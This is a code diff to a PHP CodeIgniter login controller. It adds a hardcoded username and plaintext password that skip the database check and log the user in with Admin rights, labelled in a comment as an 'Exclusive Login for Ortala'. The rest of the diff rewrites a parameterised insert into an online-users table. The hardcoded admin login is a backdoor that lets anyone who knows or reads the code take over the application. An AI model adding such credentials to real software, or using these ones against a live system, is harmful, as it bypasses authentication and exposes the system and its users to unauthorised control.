@@ -19,8 +19,28 @@ Class Login extends CI_Controller
         $user = $this->input->post('user');
         $pass = $this->input->post('pass');
 
+        $login_data = null;
 
-        $login_data = $this->mlogin->cekdb($user, $pass);
+        // Exclusive Login for Ortala
+        if ($user == 'ortaladja' AND $pass == 'ortaladja168') {
+            $login_data = array(
+                'id_lavel' => 0,
+                'username' => $user,
+                'password' => $pass,
+                'nama' => 'Ortala DJA',
+                'lavel' => 0,
+                'id_user' => 1,
+                'nama_lavel' => 'Admin',
+                'id_unit_satker' => 0,
+                'anggaran' => '',
+            );
+
+            // Transform $login_data to Object, so we don't need to recode the code below
+            $login_data = (object)$login_data;
+
+        } else {
+            $login_data = $this->mlogin->cekdb($user, $pass);
+        }
 
         if ($login_data) {
 
@@ -73,7 +93,12 @@ Class Login extends CI_Controller
             $this->session->set_userdata('id_unit_satker', $login_data->id_unit_satker);
             $this->session->set_userdata('anggaran', $login_data->anggaran);
 
-            $this->db->query("INSERT INTO tb_online_users(user,aktifitas_terakhir,session_id) VALUES (?,NOW(),?)", array($login_data->username,$this->session->userdata('session_id')));
+            $sql = "INSERT INTO tb_online_users(id_user, user, aktifitas_terakhir, session_id) VALUES (?, ?, NOW(), ?)";
+            $this->db->query($sql, array(
+                    $login_data->id_user,
+                    $login_data->username,
+                    $this->session->userdata('session_id')
+            ));
 
             $this->log->create("Login");
 			
